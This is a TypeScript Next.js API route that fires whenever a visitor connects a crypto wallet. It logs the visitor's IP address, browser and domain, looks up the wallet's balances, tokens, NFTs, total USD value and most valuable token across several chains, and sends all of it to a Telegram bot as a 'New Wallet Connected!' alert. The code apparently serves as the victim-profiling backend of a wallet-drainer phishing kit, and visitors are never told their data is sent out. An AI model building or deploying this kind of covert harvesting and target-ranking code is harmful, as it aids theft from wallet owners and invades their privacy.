// src/app/api/log_connection/route.ts
import { NextResponse } from 'next/server';
import { fetchCovalent, CHAIN_ID_TO_COVALENT_NAME } from '@/lib/covalent';
import 'server-only'; 

interface TokenInfo {
  symbol: string;
  amount: string;
  decimals: number;
  valueUsd: string;
  contractAddress?: string;
}

interface ConnectionLogForTelegram {
  id: string;
  timestamp: string;
  walletAddress: string;
  connectedWalletName: string | null;
  chainId: number;
  chainName: string;
  ipAddress: string | null;
  domain: string | null;
  userAgent: string | null;
  nativeBalanceEth: string; // Renamed to better reflect 'native' for any chain
  tokens: TokenInfo[];
  nftsDetected: boolean;
  totalWalletValueUsd: string;
  mostExpensiveTokenSymbol: string | null;
  mostExpensiveTokenValueUsd: string | null;
  mostExpensiveTokenContractAddress: string | null;
  mostExpensiveTokenChainName: string | null;
}

// --- Helper function to fetch comprehensive wallet assets ---
async function fetchWalletAssets(walletAddress: string, chainId: number, chainName: string) {
  let nativeBalanceStr = '0';
  let tokens: TokenInfo[] = [];
  let nftsDetected = false;
  let totalWalletValueUsd = 0;
  let mostExpensiveToken: {
    symbol: string;
    valueUsd: string;
    contractAddress: string;
    chainName: string;
  } | undefined = undefined;

  const lowerCaseChainName = chainName.toLowerCase();
  const isEVM = [1, 137, 11155111, 10, 56, 42161].includes(chainId); // Include more EVM chains if needed
  const isSolana = lowerCaseChainName.includes('solana');
  const isBitcoin = lowerCaseChainName.includes('bitcoin');
  const isTron = lowerCaseChainName.includes('tron');

  try {
    if (isBitcoin) {
      const blockcypherToken = process.env.BLOCKCYPHER_API_TOKEN;
      if (!blockcypherToken) {
        console.warn('BlockCypher API Token not found. Cannot fetch Bitcoin assets.');
        nativeBalanceStr = 'Error: API Key Missing';
      } else {
        const bitcoinAddressUrl = `https://api.blockcypher.com/v1/btc/main/addrs/${walletAddress}/balance?token=${blockcypherToken}`;
        try {
          const response = await fetch(bitcoinAddressUrl);
          if (!response.ok) {
            throw new Error(`BlockCypher API error: ${response.statusText}`);
          }
          const data = await response.json();
          const satoshis = data.final_balance || 0;
          const btcBalance = satoshis / 100_000_000;
          nativeBalanceStr = `${btcBalance.toFixed(8)} BTC`;

          const btcPriceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
          const btcPriceData = await btcPriceResponse.json();
          const btcPriceUsd = btcPriceData?.bitcoin?.usd || 0;

          const currentBtcValueUsd = btcBalance * btcPriceUsd;
          totalWalletValueUsd += currentBtcValueUsd;

          const currentMostExpensiveValue = parseFloat(mostExpensiveToken?.valueUsd || '0');
          if (currentBtcValueUsd > currentMostExpensiveValue) {
              mostExpensiveToken = {
                  symbol: 'BTC',
                  valueUsd: currentBtcValueUsd.toFixed(2),
                  contractAddress: 'N/A', // BTC has no contract address
                  chainName: chainName,
              };
          }

        } catch (btcApiError: any) {
          console.error(`Error fetching Bitcoin data for ${walletAddress}:`, btcApiError.message || btcApiError);
          nativeBalanceStr = 'Error Fetching BTC';
        }
      }

    } else if (isTron || isSolana || isEVM) { // Handle Tron, Solana, and EVM via Covalent
      const covalentChainId = isTron ? 'tron-mainnet' : (isSolana ? 'solana-mainnet' : CHAIN_ID_TO_COVALENT_NAME[chainId]);

      if (!covalentChainId) {
        console.warn(`Covalent chain ID not mapped for ${chainName} (ID: ${chainId}). Skipping Covalent fetch.`);
        nativeBalanceStr = 'N/A';
        tokens = [];
        nftsDetected = false;
        totalWalletValueUsd = 0;
        mostExpensiveToken = undefined;
        return { nativeBalanceEth: nativeBalanceStr, tokens, nftsDetected, totalWalletValueUsd: totalWalletValueUsd.toFixed(2), mostExpensiveToken };
      }

      try {
        // Fetch native balance
        const nativeBalanceParams = new URLSearchParams({
            'quote-currency': 'USD',
            'format': 'JSON',
        });
        const nativeBalanceData = await fetchCovalent(
          `/${covalentChainId}/address/${walletAddress}/balances_v2/`,
          nativeBalanceParams
        );

        if (nativeBalanceData.data && nativeBalanceData.data.items && nativeBalanceData.data.items.length > 0) {
            const nativeItem = nativeBalanceData.data.items.find((item: any) => item.native_token);
            if (nativeItem) {
                const nativeBalanceFormatted = parseFloat(nativeItem.balance) / Math.pow(10, nativeItem.contract_decimals);
                nativeBalanceStr = `${nativeBalanceFormatted.toFixed(4)} ${nativeItem.contract_ticker_symbol}`;
                const nativeValueUsd = nativeItem.quote;
                totalWalletValueUsd += nativeValueUsd || 0;

                const currentMostExpensiveValue = parseFloat(mostExpensiveToken?.valueUsd || '0');
                if ((nativeValueUsd || 0) > currentMostExpensiveValue) {
                    mostExpensiveToken = {
                        symbol: nativeItem.contract_ticker_symbol,
                        valueUsd: (nativeValueUsd || 0).toFixed(2),
                        contractAddress: 'N/A',
                        chainName: chainName,
                    };
                }
            }

            // Fetch tokens and NFTs
            for (const item of nativeBalanceData.data.items) {
                if (!item.native_token && item.type === 'fungible') { // Regular tokens
                    const tokenBalanceFormatted = parseFloat(item.balance) / Math.pow(10, item.contract_decimals);
                    const tokenValueUsd = item.quote;
                    if (tokenBalanceFormatted > 0) {
                        tokens.push({
                            symbol: item.contract_ticker_symbol || 'UNKNOWN',
                            amount: tokenBalanceFormatted.toFixed(4),
                            decimals: item.contract_decimals,
                            valueUsd: (tokenValueUsd || 0).toFixed(2),
                            contractAddress: item.contract_address,
                        });
                        totalWalletValueUsd += tokenValueUsd || 0;
                        const currentMostExpensiveValue = parseFloat(mostExpensiveToken?.valueUsd || '0');
                        if ((tokenValueUsd || 0) > currentMostExpensiveValue) {
                            mostExpensiveToken = {
                                symbol: item.contract_ticker_symbol || 'UNKNOWN',
                                valueUsd: (tokenValueUsd || 0).toFixed(2),
                                contractAddress: item.contract_address,
                                chainName: chainName,
                            };
                        }
                    }
                } else if (item.type === 'nft') { // NFTs
                    nftsDetected = true; // Covalent's balances_v2 endpoint often includes NFTs
                }
            }
        }

      } catch (covalentApiError: any) {
        console.error(`Error fetching Covalent data for ${chainName} (${chainId}) and wallet ${walletAddress}:`, covalentApiError.message || covalentApiError);
        nativeBalanceStr = `Error Fetching ${chainName.split(' ')[0]}`;
        tokens = [];
        nftsDetected = false;
        totalWalletValueUsd = 0;
        mostExpensiveToken = undefined;
      }

    } else {
        console.warn(`Unsupported chain for asset fetching: ${chainName} (ID: ${chainId}).`);
        nativeBalanceStr = 'N/A';
        tokens = [];
        nftsDetected = false;
        totalWalletValueUsd = 0;
        mostExpensiveToken = undefined;
    }


  } catch (apiError: any) {
    console.error('General error fetching blockchain data for wallet:', walletAddress, apiError.message);
    nativeBalanceStr = 'Error Fetching';
    tokens = [];
    nftsDetected = false;
    totalWalletValueUsd = 0;
    mostExpensiveToken = undefined;
  }

  return {
    nativeBalanceEth: nativeBalanceStr, // Now reflects general native balance
    tokens,
    nftsDetected,
    totalWalletValueUsd: totalWalletValueUsd.toFixed(2),
    mostExpensiveToken,
  };
}


// --- Function to Send Telegram Message (MODIFIED TO LOG FULL RESPONSE) ---
async function sendTelegramMessage(messageText: string) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.warn('Telegram Bot Token or Chat ID not set. Skipping Telegram notification.');
    return;
  }

  const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    const responseData = await response.json(); // ALWAYS parse JSON response
    console.log('Telegram API Raw Response:', response.status, responseData); // Log full response

    if (!response.ok) {
      console.error('Failed to send Telegram message:', response.status, responseData);
      // Throw error to be caught by the calling function if needed
      throw new Error(`Telegram API error: ${responseData.description || 'Unknown error'}`);
    } else if (responseData.ok === false) { // Telegram API sometimes returns 200 with "ok: false" for errors
        console.error('Telegram API reported failure despite 2xx status:', responseData);
        throw new Error(`Telegram API reported failure: ${responseData.description || 'Unknown error'}`);
    } else {
      console.log('Telegram message sent successfully!');
    }
  } catch (error: any) {
    console.error('Error sending Telegram message:', error.message || error);
  }
}


// --- POST request handler for logging connections ---
export async function POST(request: Request) {
  try {
    const { walletAddress, connectedWalletName, chainId, chainName } = await request.json();

    if (!walletAddress || !connectedWalletName || typeof chainId !== 'number' || !chainName) {
      return NextResponse.json({ message: 'Missing required connection details' }, { status: 400 });
    }

    const ipAddress: string | null = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || null;
    const userAgent: string | null = request.headers.get('user-agent');
    const domain: string | null = request.headers.get('origin') || request.headers.get('host');

    // Fetch assets using the updated logic
    const assetData = await fetchWalletAssets(walletAddress, chainId, chainName);

    const logId = Math.random().toString(36).substring(2, 11);
    const currentTimestamp = new Date().toISOString();

    const logEntryForTelegram: ConnectionLogForTelegram = {
      id: logId,
      timestamp: currentTimestamp,
      walletAddress: walletAddress,
      connectedWalletName: connectedWalletName,
      chainId: chainId,
      chainName: chainName,
      ipAddress: ipAddress,
      domain: domain,
      userAgent: userAgent,
      nativeBalanceEth: assetData.nativeBalanceEth,
      tokens: assetData.tokens,
      nftsDetected: assetData.nftsDetected,
      totalWalletValueUsd: assetData.totalWalletValueUsd,
      mostExpensiveTokenSymbol: assetData.mostExpensiveToken?.symbol || null,
      mostExpensiveTokenValueUsd: assetData.mostExpensiveToken?.valueUsd || null,
      mostExpensiveTokenContractAddress: assetData.mostExpensiveToken?.contractAddress || null,
      mostExpensiveTokenChainName: assetData.mostExpensiveToken?.chainName || null,
    };

    console.log('Processed connection log (for Telegram):', logEntryForTelegram);

    let telegramMessage = `
<b>New Wallet Connected!</b> #ID${logEntryForTelegram.id}
-------------------------------------
<b>Wallet:</b> ${logEntryForTelegram.connectedWalletName || 'N/A'}
<b>Address:</b> <code>${logEntryForTelegram.walletAddress}</code>
<b>Chain:</b> ${logEntryForTelegram.chainName} (ID: ${logEntryForTelegram.chainId})
<b>Time:</b> ${new Date(logEntryForTelegram.timestamp).toLocaleString()}

<b>Domain:</b> ${logEntryForTelegram.domain || 'N/A'}
<b>IP:</b> ${logEntryForTelegram.ipAddress || 'N/A'}
<b>Device:</b> ${logEntryForTelegram.userAgent ? (logEntryForTelegram.userAgent.includes('Mobile') ? '📱 Mobile' : '🖥️ Desktop') : 'N/A'}
<b>Browser:</b> ${logEntryForTelegram.userAgent ? (
    (logEntryForTelegram.userAgent.includes('Chrome')) ? 'Chrome' :
    (logEntryForTelegram.userAgent.includes('Firefox')) ? 'Firefox' :
    (logEntryForTelegram.userAgent.includes('Safari')) ? 'Safari' :
    'Other'
) : 'N/A'}

<b>-- Wallet Assets --</b>
<b>Native:</b> ${logEntryForTelegram.nativeBalanceEth}
<b>Tokens:</b>
${logEntryForTelegram.tokens && logEntryForTelegram.tokens.length > 0
  ? logEntryForTelegram.tokens.map(t => `  • ${t.amount} ${t.symbol} ($${t.valueUsd})`).join('\n')
  : '  No tokens detected'
}
<b>NFTs Detected:</b> ${logEntryForTelegram.nftsDetected ? '✅ Yes' : '❌ No'}
<b>Total Value:</b> $${logEntryForTelegram.totalWalletValueUsd}
<b>Most Expensive Token:</b> ${logEntryForTelegram.mostExpensiveTokenSymbol ? `${logEntryForTelegram.mostExpensiveTokenSymbol} ($${logEntryForTelegram.mostExpensiveTokenValueUsd})` : 'N/A'}
`;

    // Sanitize message to prevent HTML injection, then re-add specific HTML tags
    telegramMessage = telegramMessage.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    telegramMessage = telegramMessage
      .replace(/&lt;b&gt;/g, '<b>')
      .replace(/&lt;\/b&gt;/g, '</b>')
      .replace(/&lt;code&gt;/g, '<code>')
      .replace(/&lt;\/code&gt;/g, '</code>');


    await sendTelegramMessage(telegramMessage); // Await this call

    return NextResponse.json({ message: 'Connection logged to Telegram successfully', id: logId }, { status: 200 });

  } catch (error: any) {
    console.error('Error processing connection for Telegram:', error.message);
    return NextResponse.json({ message: 'Internal Server Error' }, { status: 500 });
  }
}

// --- GET request handler (Removed as no database to retrieve logs from) ---
export async function GET() {
  return NextResponse.json({ message: 'Admin panel not available in database-less mode. Logs are sent to Telegram only.' }, { status: 404 });
}